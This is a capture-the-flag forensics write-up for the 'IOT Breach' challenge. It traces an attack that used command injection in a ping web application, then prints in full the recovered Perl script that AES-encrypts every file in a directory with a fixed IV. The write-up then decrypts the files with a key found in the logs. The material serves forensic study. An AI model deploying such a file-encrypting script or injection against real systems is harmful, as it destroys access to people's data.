# IOT Breach

**Category:** *forensics*

## Description

Please help me! A hacker has attacked my network and now I can't see my files anymore :( Can you please help me to recover them?

## Solution

The disk image (`.img`) was provided. The image contained all files including **root** directory. There is a directory with encrypted kitten pictures:

![Encrypted files](../resources/WHY2025%20CTF/iotbreach1.png)

I searched through all the files and found several interesting things: in the file `./var/log/lighttpd/access.log` I found many logs with strange data. It looked like base64 data that was sent through a web-access ping application with command injection vulnerability:

![Web server logs with base64 decoded data](../resources/WHY2025%20CTF/iotbreach2.png)

I decoded all the transferred data and recovered the following Perl script:

```perl
use strict;
use warnings;
use Crypt::Mode::CBC;
use File::Find;

# Check if password is provided
die "Usage: $0 <password>
" unless @ARGV == 1;
my $password = $ARGV[0];

# Define encryption parameters
my $cipher = Crypt::Mode::CBC->new("AES");

# Get all files in the current directory
find(sub {
    return if -d $_;  # Skip directories
    return if $_ =~ /.pl$/;
    encrypt_file($_);
}, ".");

sub encrypt_file {
    my ($file) = @_;

    # Read file contents
    open my $fh, '<', $file or die "Could not open '$file' for reading: $!";
    binmode $fh;
    my $data = do { local $/; <$fh> };
    close $fh;

    # Encrypt the data
    my $encrypted = $cipher->encrypt($data, $password, "R4ND0MivR4ND0Miv");

    # Write encrypted data back to file
    open my $fh_out, '>', "$file.enc" or die "Could not open '$file.enc' for writing: $!";
    binmode $fh_out;
    print $fh_out $encrypted;
    close $fh_out;

    print "Encrypted $file -> $file.enc
";
}

print "Encryption complete.
";

```

I found that pictures were encrypted using the `AES` algorithm with the Initialization Vector `R4ND0MivR4ND0Miv`. Also there was an encryption key in the web server logs:

![The encryption key](../resources/WHY2025%20CTF/iotbreach3_0.png)
![URL decoded encryption key](../resources/WHY2025%20CTF/iotbreach3_1.png)

Using the CyberChief, I recovered encrypted pictures and one of the pictures contained the flag:

![The flag](../resources/WHY2025%20CTF/iotbreach4.jpg)